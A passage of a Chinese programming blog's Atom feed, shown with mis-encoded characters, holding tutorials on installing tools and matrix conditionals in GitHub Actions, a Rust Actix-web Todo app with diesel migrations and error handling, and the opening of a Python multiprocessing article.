      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬4å¤©ï¼šå®‰è£…å·¥å…·</title>
    <link href="https://qiwihui.com/qiwihui-blog-87/"/>
    <id>https://qiwihui.com/qiwihui-blog-87/</id>
    <published>2022-08-13T01:54:25.700Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©æˆ‘æåˆ° GitHub Actions æä¾›äº† <a href="https://qiwihui.com/qiwihui-blog-86/">Linuxï¼ŒWindows å’Œ macOS è™šæ‹Ÿç¯å¢ƒ</a>ï¼Œä½ å¯ä»¥åœ¨å…¶ä¸­è¿è¡Œå·¥ä½œæµã€‚</p><p>ä½†æ˜¯è¿™äº›ç¯å¢ƒä¸Šå®é™…å®‰è£…äº†ä»€ä¹ˆï¼Ÿ åŸæ¥æœ‰<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/software-installed-on-github-hosted-runners">å¾ˆå¤šå®‰è£…</a>ã€‚</p><p>å›¢é˜Ÿè¯•å›¾é€šè¿‡è®¸å¤šä¸åŒçš„å¹³å°ä½¿æˆ‘ä»¬çš„è¿è¡Œå™¨ï¼ˆrunnersï¼‰ä¿æŒæœ€æ–°çŠ¶æ€ã€‚ å› æ­¤ï¼Œä½ ä¼šå‘ç°è®¸å¤šä¸åŒç‰ˆæœ¬çš„Pythonï¼ŒRubyï¼Œ.NET Coreç­‰ã€‚ ä½†æ˜¯â”€â”€ä»…ä»…ä¾é è¿™äº›å„ç§å„æ ·çš„å¼€å‘å·¥å…·â”€â”€ä»–ä»¬ä¸å¯èƒ½ç»å¯¹å®‰è£…æ‰€æœ‰ä¸œè¥¿ã€‚</p><p>æœ‰æ—¶ä½ éœ€è¦è‡ªå·±å®‰è£…ã€‚è€Œä¸”ç”±äºä½ æ‹¥æœ‰ä¸€å°å®Œæ•´çš„è™šæ‹Ÿæœºï¼Œå› æ­¤å¯¹äºæ¯é¡¹ä½œä¸šæ‰§è¡Œï¼Œä½ éƒ½å¯ä»¥åœ¨å…¶ä¸Šå®‰è£…ä»»ä½•æ‰€éœ€çš„è½¯ä»¶ã€‚</p><span id="more"></span><p>ä¾‹å¦‚ï¼Œä½ å¯èƒ½è¦å®‰è£…éå¸¸å¥½çš„â€œ<a href="https://ninja-build.org/">ninja</a>â€æ„å»ºå·¥å…·ã€‚</p><h3><span id="linux">Linux</span></h3><p>Linuxè™šæ‹Ÿç¯å¢ƒè¿è¡ŒUbuntuï¼Œå› æ­¤ä½ å¯ä»¥ä½¿ç”¨ <a href="https://en.wikipedia.org/wiki/APT_(Package_Manager)">apt</a> å®‰è£…å¯èƒ½éœ€è¦çš„ä»»ä½•å…¶ä»–å·¥å…·ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œä½ ä»¥é root ç”¨æˆ·èº«ä»½è¿è¡Œï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨æ— å¯†ç  sudoã€‚è¿™æ ·ä½ å°±å¯ä»¥ï¼š</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">run:</span> <span class="string">sudo</span> <span class="string">apt-get</span> <span class="string">install</span> <span class="string">ninja-build</span></span><br></pre></td></tr></table></figure><h3><span id="windows">Windows</span></h3><p><a href="https://chocolatey.org/">Chocolatey</a> æ˜¯ Windows çš„é¦–é€‰è½¯ä»¶åŒ…ç®¡ç†å™¨ï¼Œå®ƒå·²å®‰è£…å¹¶å¯ä»¥åœ¨ GitHub Actions è™šæ‹Ÿç¯å¢ƒä¸­ä½¿ç”¨ã€‚</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">run:</span> <span class="string">choco</span> <span class="string">install</span> <span class="string">ninja</span></span><br></pre></td></tr></table></figure><h3><span id="macos">macOS</span></h3><p>åœ¨ macOS ä¸Šï¼Œ<a href="https://brew.sh/">Homebrew</a> æ˜¯æ¨èçš„è½¯ä»¶åŒ…ç®¡ç†å™¨ï¼Œå¯åœ¨ GitHub Actions è™šæ‹Ÿç¯å¢ƒä¸­ä½¿ç”¨ã€‚æ— éœ€ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œ Homebrew â”€â”€å®é™…ä¸Šï¼Œè¿™æ˜¯ä¸åˆæ—¶å®œçš„ï¼Œå› æ­¤æ‚¨å¯ä»¥æ‰§è¡Œ <code>brew install</code>ï¼š</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">run:</span> <span class="string">brew</span> <span class="string">install</span> <span class="string">ninja</span></span><br></pre></td></tr></table></figure><h3><span id="he-zai-yi-qi">åˆåœ¨ä¸€èµ·</span></h3><p>ç»¼ä¸Šæ‰€è¿°ï¼Œå¦‚æœä½ æƒ³åœ¨æ‰€æœ‰ä¸‰ä¸ªå¹³å°ä¸Šå®‰è£… ninjaï¼Œä½ çš„å·¥ä½œæµç¨‹å°†<a href="https://gist.github.com/ethomson/68a7e60b9b5fbe081c8edd65237a2f22">å¦‚ä¸‹æ‰€ç¤º</a>ï¼š</p><script src="https://gist.github.com/ethomson/68a7e60b9b5fbe081c8edd65237a2f22.js"></script><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_4_installing_tools.html">https://www.edwardthomson.com/blog/github_actions_4_installing_tools.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬4å¤©ï¼šå®‰è£…å·¥å…·
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬14å¤©ï¼šçŸ©é˜µæ¡ä»¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-97/"/>
    <id>https://qiwihui.com/qiwihui-blog-97/</id>
    <published>2022-08-13T01:54:25.700Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub Actions å…·æœ‰è®¸å¤šå¼ºå¤§çš„ç»„ä»¶ï¼Œä½†æ˜¯å½“ä½ å¼€å§‹ä¸€èµ·ä½¿ç”¨å®ƒä»¬æ—¶ï¼Œäº‹æƒ…å°±å¼€å§‹å˜å¾—çœŸæ­£å¼ºå¤§ã€‚ä¾‹å¦‚ï¼šçŸ©é˜µå·¥ä½œæµä½¿ä½ å¯ä»¥è½»æ¾åœ°å°†ç®€å•çš„å·¥ä½œæµæ‰©å±•åˆ°å¤šä¸ªä¸åŒçš„ä½œä¸šã€‚é€šè¿‡æ¡ä»¶æ‰§è¡Œï¼Œä½ å¯ä»¥é™åˆ¶ä½œä¸šä¸­æ­¥éª¤çš„æ‰§è¡Œã€‚</p><p>è¿™ä¸¤ä¸ªåŠŸèƒ½å¾ˆè‡ªç„¶åœ°ç»“åˆåœ¨ä¸€èµ·â”€â”€å½“ä½ è·¨ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œå¹³å°æˆ–è¯­è¨€ç‰ˆæœ¬æ„å»ºçŸ©é˜µæ—¶ï¼Œå¯èƒ½åªéœ€è¦åœ¨è¯¥çŸ©é˜µçš„ä¸€ä¸ªå­é›†ä¸Šè¿è¡Œä¸€äº›æ­¥éª¤ã€‚ä¾‹å¦‚ï¼šåœ¨Linuxä¸Šè¿è¡Œæ—¶ï¼Œå¯èƒ½éœ€è¦å®‰è£…å…¶ä»–ç¼–è¯‘å™¨ï¼Œæˆ–è€…å¯¹äºä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œå¯èƒ½éœ€è¦å®‰è£…ç¨æœ‰ä¸åŒçš„ä¾èµ–é¡¹ã€‚</p><p>æˆ‘å¯ä»¥ç»“åˆä¸€äº›ä»¥å‰çš„æ¦‚å¿µæ¥ä¸ºæˆ‘çš„ä¸€ä¸ªé¡¹ç›®ï¼ˆCè¯­è¨€ä¸­çš„ç³»ç»Ÿåº“ï¼‰æ„å»ºå·¥ä½œæµã€‚å®ƒå°†ä½¿ç”¨<a href="https://qiwihui.com/qiwihui-blog-86/">è·¨å¹³å°</a>å’Œ<a href="https://qiwihui.com/qiwihui-blog-87/">å·¥å…·å®‰è£…</a>çš„<a href="https://qiwihui.com/qiwihui-blog-85/">çŸ©é˜µå·¥ä½œæµ</a>æ¥æ‰§è¡ŒCIçš„æ„å»ºå’Œæµ‹è¯•æ­¥éª¤ã€‚</p><span id="more"></span><p>ç›®æ ‡æ˜¯å®‰è£…Ninjaæ„å»ºç³»ç»Ÿï¼Œç„¶åä½¿ç”¨CMakeåˆ›å»ºæ„å»ºè„šæœ¬ä»¥åˆ©ç”¨è¿™ä¸€ä¼˜åŠ¿â”€â”€CMakeå’ŒNinjaå¯ä»¥å¾ˆå¥½åœ°ååŒå·¥ä½œï¼Œä»¥ç”Ÿæˆå¿«é€Ÿï¼Œè·¨å¹³å°çš„æœ¬æœºæ„å»ºã€‚æœ€åï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ <code>cmake</code> è¿›è¡Œæ„å»ºï¼Œå¹¶ä½¿ç”¨ <code>ctest</code> è¿›è¡Œæµ‹è¯•ã€‚</p><script src="https://gist.github.com/ethomson/79c787cecee5c23f2c791500d6644583.js"></script><p>è¿è¡Œæ­¤å‘½ä»¤æ—¶ï¼Œæ¡ä»¶å°†ç¡®ä¿ä»…å¯¹ç‰¹å®šå¹³å°è¿è¡Œé€‚å½“çš„â€œå®‰è£…ä¾èµ–é¡¹â€æ­¥éª¤ã€‚å…¶ä»–å¹³å°çš„å…¶ä»–æ­¥éª¤å°†è¢«è·³è¿‡ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77774001-58bd8c80-7085-11ea-8a82-90115b7ba69f.png" alt="image"></p><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¼€å§‹äº†è§£å¦‚ä½•å°†GitHub Actionsçš„ç®€å•ç‰‡æ®µç»„åˆåˆ°æ›´å¤æ‚ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§çš„å·¥ä½œæµç¨‹ä¸­ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_14_conditionals_with_a_matrix.html">https://www.edwardthomson.com/blog/github_actions_14_conditionals_with_a_matrix.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬14å¤©ï¼šçŸ©é˜µæ¡ä»¶
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>ç”¨ Rust Actix-web å†™ä¸€ä¸ª Todo åº”ç”¨ï¼ˆä¸‰ï¼‰â”€â”€ migrations å’Œé”™è¯¯å¤„ç†</title>
    <link href="https://qiwihui.com/qiwihui-blog-107/"/>
    <id>https://qiwihui.com/qiwihui-blog-107/</id>
    <published>2022-08-13T01:54:25.690Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="shi-yong-diesel-guan-li-shu-ju-ku-bian-hua">ä½¿ç”¨ diesel ç®¡ç†æ•°æ®åº“å˜åŒ–</span></h2><p>diesel æ˜¯ä¸€ä¸ªç”¨ rust å†™çš„ ORM åº“ï¼Œæ”¯æŒå¤šç§æ•°æ®åº“ï¼ŒåŒæ—¶ diesel æä¾›äº†å¯¹æ•°æ®åº“ç»“æ„çš„ç®¡ç†åŠŸèƒ½ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ diesel å¯¹æˆ‘ä»¬çš„æ•°æ®åº“ç»“æ„å˜åŒ–è¿›è¡Œç®¡ç†ã€‚</p><span id="more"></span><p>é¦–å…ˆï¼Œå®‰è£…å‘½ä»¤è¡Œå·¥å…· <code>diesel_cli</code>ï¼Œå¹¶åˆå§‹åŒ–æ•°æ®åº“è®¾ç½®</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å®‰è£… diesel_cliï¼Œæ”¯æŒ postgres</span></span><br><span class="line">cargo install diesel_cli --no-default-features --features postgres</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è®¾ç½®æ•°æ®åº“è¿æ¥</span></span><br><span class="line">echo DATABASE_URL=postgres://actix:actix@localhost:5432/actix &gt;&gt; .env</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ç”Ÿæˆ diesel.toml æ–‡ä»¶æŒ‡å‘ schema æ‰€åœ¨</span></span><br><span class="line">diesel setup</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åˆ›å»ºæ•°æ®åº“ migration</span></span><br><span class="line">diesel migration generate create_db</span><br></pre></td></tr></table></figure><p>åœ¨ç”Ÿæˆçš„ <code>migrations</code> ç›®å½•ä¸­ï¼Œå¡«å…¥æ•°æ®åº“å˜åŒ–çš„ sql è¯­å¥ï¼Œ<code>up.sql</code> ç”¨äºä¿®æ”¹ï¼Œ<code>down.sql</code> ç”¨äºæ’¤é”€ä¿®æ”¹ã€‚</p><p><code>up.sql</code>ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> todo_list (</span><br><span class="line">    id serial <span class="keyword">primary</span> key,</span><br><span class="line">    title <span class="type">varchar</span>(<span class="number">150</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> todo_item (</span><br><span class="line">    id serial <span class="keyword">primary</span> key,</span><br><span class="line">    title <span class="type">varchar</span>(<span class="number">150</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    checked <span class="type">boolean</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> <span class="literal">false</span>,</span><br><span class="line">    list_id <span class="type">integer</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">foreign</span> key (list_id) <span class="keyword">references</span> todo_list(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>down.sql</code>ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> todo_item;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> todo_list;</span><br></pre></td></tr></table></figure><p>ç”±äºä¹‹å‰å·²ç»æœ‰å¯¹åº”çš„æ•°æ®è¡¨ç»“æ„ï¼Œéœ€è¦å°†åŸæ¥çš„è¡¨ç»“æ„åˆ é™¤ï¼Œå†è¿è¡Œæ•°æ®åº“å˜æ›´ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åˆ é™¤åŸæœ‰çš„æ•°æ®è¡¨ä¹‹å</span></span><br><span class="line">diesel migrations run</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œå¯¹åº”ç”Ÿæˆçš„ schema ä¸ºï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">table! &#123;</span><br><span class="line">    <span class="title function_ invoke__">todo_item</span> (id) &#123;</span><br><span class="line">        id <span class="punctuation">-&gt;</span> Int4,</span><br><span class="line">        title <span class="punctuation">-&gt;</span> Varchar,</span><br><span class="line">        checked <span class="punctuation">-&gt;</span> Bool,</span><br><span class="line">        list_id <span class="punctuation">-&gt;</span> Int4,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">table! &#123;</span><br><span class="line">    <span class="title function_ invoke__">todo_list</span> (id) &#123;</span><br><span class="line">        id <span class="punctuation">-&gt;</span> Int4,</span><br><span class="line">        title <span class="punctuation">-&gt;</span> Varchar,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">joinable!(todo_item <span class="punctuation">-&gt;</span> <span class="title function_ invoke__">todo_list</span> (list_id));</span><br><span class="line"></span><br><span class="line">allow_tables_to_appear_in_same_query!(</span><br><span class="line">    todo_item,</span><br><span class="line">    todo_list,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæ•°æ®åº“ä¸­çš„è¡¨æœºæ„å°±å’Œæˆ‘ä»¬ä¹‹å‰æ˜¯ä¸€æ ·çš„ï¼ŒåŒæ—¶å¢åŠ äº†ä¸€ä¸ªç”¨äºè®°å½•å·²ç»åšè¿‡çš„ migrations çš„æ•°æ®åº“ã€‚</p><h2><span id="orm">ORM</span></h2><p>é‰´äº diesel æ²¡æœ‰ async ç‰ˆæœ¬ï¼Œä»¥åŠ quaint ä¸æ˜¯ type-safeï¼Œä¸åš ORM çš„æ”¯æŒã€‚</p><h2><span id="cuo-wu-chu-li">é”™è¯¯å¤„ç†</span></h2><p>è‡ªå®šä¹‰é”™è¯¯ï¼Œå¹¶å°†å¸¸è§çš„é”™è¯¯ç»Ÿä¸€å¤„ç†ã€‚</p><p>æ–°å¢ <code>errors.rs</code>ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_web::http::StatusCode;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;HttpResponse, ResponseError&#125;;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres::PoolError;</span><br><span class="line"><span class="keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;</span><br><span class="line"><span class="keyword">use</span> std::fmt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="meta">#[allow(dead_code)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Error</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">InternalServerError</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">NotFound</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">PoolError</span>(<span class="type">String</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug, Serialize, Deserialize)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">ErrorResponse</span> &#123;</span><br><span class="line">    errors: <span class="type">Vec</span>&lt;<span class="type">String</span>&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">fmt</span>::Display <span class="keyword">for</span> <span class="title class_">Error</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">fmt</span>(&amp;<span class="keyword">self</span>, f: &amp;<span class="keyword">mut</span> fmt::Formatter&lt;<span class="symbol">&#x27;_</span>&gt;) <span class="punctuation">-&gt;</span> fmt::<span class="type">Result</span> &#123;</span><br><span class="line">        <span class="built_in">write!</span>(f, <span class="string">&quot;&#123;&#125;&quot;</span>, <span class="keyword">self</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">ResponseError</span> <span class="keyword">for</span> <span class="title class_">Error</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">error_response</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> HttpResponse &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            Error::<span class="title function_ invoke__">NotFound</span>(message) =&gt; &#123;</span><br><span class="line">                HttpResponse::<span class="title function_ invoke__">NotFound</span>().json::&lt;ErrorResponse&gt;(message.<span class="title function_ invoke__">into</span>())</span><br><span class="line">            &#125;</span><br><span class="line">            _ =&gt; HttpResponse::<span class="title function_ invoke__">new</span>(StatusCode::INTERNAL_SERVER_ERROR),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ”¯æŒ å­—ç¬¦ä¸² into</span></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">From</span>&lt;&amp;<span class="type">String</span>&gt; <span class="keyword">for</span> <span class="title class_">ErrorResponse</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">from</span>(error: &amp;<span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        ErrorResponse &#123;</span><br><span class="line">            errors: <span class="built_in">vec!</span>[error.<span class="title function_ invoke__">into</span>()],</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤„ç† PoolError</span></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">From</span>&lt;PoolError&gt; <span class="keyword">for</span> <span class="title class_">Error</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">from</span>(error: PoolError) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        Error::<span class="title function_ invoke__">PoolError</span>(error.<span class="title function_ invoke__">to_string</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ <code>db.rs</code>ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">+<span class="keyword">use</span> crate::errors::Error;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">-        <span class="literal">None</span> =&gt; <span class="title function_ invoke__">Err</span>(Error::<span class="title function_ invoke__">new</span>(ErrorKind::NotFound, <span class="string">&quot;Not found&quot;</span>)),</span><br><span class="line">+        <span class="literal">None</span> =&gt; <span class="title function_ invoke__">Err</span>(Error::<span class="title function_ invoke__">NotFound</span>(<span class="string">&quot;Not found&quot;</span>.<span class="title function_ invoke__">into</span>())),</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ <code>handlers.rs</code>ï¼Œå…¶ä¸­ä¸€ä¸ªè¯·æ±‚å¤„ç†</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">+<span class="keyword">use</span> crate::errors::Error;</span><br><span class="line"><span class="comment">// error_responseï¼šitems from traits can only be used if the trait is in scope</span></span><br><span class="line">+<span class="keyword">use</span> actix_web::ResponseError;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">-<span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">todos</span>(state: web::Data&lt;AppState&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">+<span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">todos</span>(state: web::Data&lt;AppState&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse, Error&gt; &#123;</span><br><span class="line">     <span class="keyword">let</span> <span class="variable">client</span>: Client = state</span><br><span class="line">         .pool</span><br><span class="line">         .<span class="title function_ invoke__">get</span>()</span><br><span class="line">@@ -<span class="number">33</span>,<span class="number">12</span> +<span class="number">34</span>,<span class="number">15</span> @@ <span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">todos</span>(state: web::Data&lt;AppState&gt;) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">         .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error connecting to the database&quot;</span>);</span><br><span class="line">     <span class="keyword">let</span> <span class="variable">result</span> = db::<span class="title function_ invoke__">get_todos</span>(&amp;client).<span class="keyword">await</span>;</span><br><span class="line">     <span class="keyword">match</span> result &#123;</span><br><span class="line">-        <span class="title function_ invoke__">Ok</span>(todos) =&gt; HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">json</span>(todos),</span><br><span class="line">-        <span class="title function_ invoke__">Err</span>(_) =&gt; HttpResponse::<span class="title function_ invoke__">InternalServerError</span>().<span class="title function_ invoke__">into</span>(),</span><br><span class="line">+        <span class="title function_ invoke__">Ok</span>(todos) =&gt; <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">json</span>(todos)),</span><br><span class="line">+        <span class="title function_ invoke__">Err</span>(e) =&gt; <span class="title function_ invoke__">Ok</span>(e.<span class="title function_ invoke__">error_response</span>()),</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2><span id="xiao-jie">å°ç»“</span></h2><ol><li>ç®¡ç†æ•°æ®åº“ç»“æ„å˜æ›´ï¼›</li><li>è‡ªå®šä¹‰é”™è¯¯å¤„ç†</li></ol><h2><span id="can-kao-wen-dang-he-xiang-mu">å‚è€ƒæ–‡æ¡£å’Œé¡¹ç›®</span></h2><ol><li><a href="https://www.youtube.com/watch?v=gQwA0g0NNSI">Creating a simple TODO service with Actix</a></li><li><a href="actix.rs">actix-web å®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://github.com/actix/examples">å®˜æ–¹ actix-web ç¤ºä¾‹</a></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ç”¨ Rust Actix-web å†™ä¸€ä¸ª Todo åº”ç”¨ï¼ˆä¸‰ï¼‰â”€â”€ migrations å’Œé”™è¯¯å¤„ç†
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Rust" scheme="https://qiwihui.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>15. å¤šçº¿ç¨‹å’Œå¤šè¿›ç¨‹ â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-133/"/>
    <id>https://qiwihui.com/qiwihui-blog-133/</id>
    <published>2022-08-13T01:54:25.690Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘ä»¬æœ‰ä¸¤ç§å¸¸ç”¨çš„æ–¹æ³•æ¥å¹¶è¡Œè¿è¡Œä»£ç ï¼ˆå®ç°å¤šä»»åŠ¡å¹¶åŠ å¿«ç¨‹åºé€Ÿåº¦ï¼‰ï¼šé€šè¿‡çº¿ç¨‹æˆ–é€šè¿‡å¤šè¿›ç¨‹ã€‚</p><span id="more"></span><h2><span id="jin-cheng">è¿›ç¨‹</span></h2><p>è¿›ç¨‹æ˜¯ç¨‹åºçš„ä¸€ä¸ªå®ä¾‹ï¼Œä¾‹å¦‚Pythonè§£é‡Šå™¨ã€‚å®ƒä»¬å½¼æ­¤ç‹¬ç«‹ï¼Œå¹¶ä¸”ä¸å…±äº«ç›¸åŒçš„å†…å­˜ã€‚</p><p>å…³é”®äº‹å®ï¼š</p><ul><li>ä¸€ä¸ªæ–°è¿›ç¨‹ç‹¬ç«‹äºç¬¬ä¸€ä¸ªè¿›ç¨‹å¯åŠ¨</li><li>å……åˆ†åˆ©ç”¨å¤šä¸ªCPUå’Œå†…æ ¸</li><li>å•ç‹¬çš„å†…å­˜ç©ºé—´</li><li>è¿›ç¨‹ä¹‹é—´ä¸å…±äº«å†…å­˜</li><li>æ¯ä¸ªè¿›ç¨‹ä¸€ä¸ªGILï¼ˆå…¨å±€è§£é‡Šå™¨é”ï¼‰ï¼Œå³é¿å…äº†GILé™åˆ¶</li><li>éå¸¸é€‚åˆCPUå¯†é›†å‹å¤„ç†</li><li>å­è¿›ç¨‹å¯ä¸­æ–­/å¯ç»ˆæ­¢</li><li>å¯åŠ¨è¿›ç¨‹æ…¢äºå¯åŠ¨çº¿ç¨‹</li><li>æ›´å¤§çš„å†…å­˜å ç”¨</li><li>IPCï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰æ›´åŠ å¤æ‚</li></ul><h3><span 